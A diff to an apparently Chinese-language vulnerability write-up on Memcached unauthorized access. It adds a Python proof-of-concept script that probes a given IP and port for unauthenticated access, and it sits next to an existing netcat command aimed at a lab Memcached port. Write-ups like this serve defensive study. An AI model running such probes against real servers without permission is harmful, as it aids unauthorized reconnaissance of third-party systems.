@@ -117,6 +117,57 @@ nc -vv 10.9.75.7 11211
 
 ![image-20231216095813248](./imgs/image-20231216095813248.png)
 
+##### 3.3、POC验证
+
+```python
+#!/usr/bin/python3
+ 
+ 
+import argparse
+ 
+import pymemcache
+ 
+ 
+# 命令行参数解析
+ 
+parser = argparse.ArgumentParser(description='Check Memcached Unauthorized Access Vulnerability.')
+ 
+parser.add_argument('-u', '--url', dest='url', metavar='IP:PORT', required=True, help='The IP address and port of the target Memcached server.')
+ 
+ 
+# 解析命令行参数
+ 
+args = parser.parse_args()
+ 
+server, port = args.url.split(':')
+ 
+ 
+# 检测Memcached是否存在未授权访问漏洞
+ 
+def check_memcached_vuln():
+ 
+    # 尝试建立连接
+ 
+    client = pymemcache.client.base.Client((server, int(port)))
+ 
+    # 尝试进行get操作，如果成功则代表存在未授权访问漏洞
+ 
+    try:
+ 
+        client.get('test')
+ 
+        print(f'[+]{server}:{port} 存在安全漏洞!')
+ 
+    except:
+ 
+        print(f'[-]{server}:{port} 未检测到漏洞!')
+ 
+ 
+if __name__ == '__main__':
+ 
+    check_memcached_vuln()
+```
+
 
 
 ### 1.5、修复建议
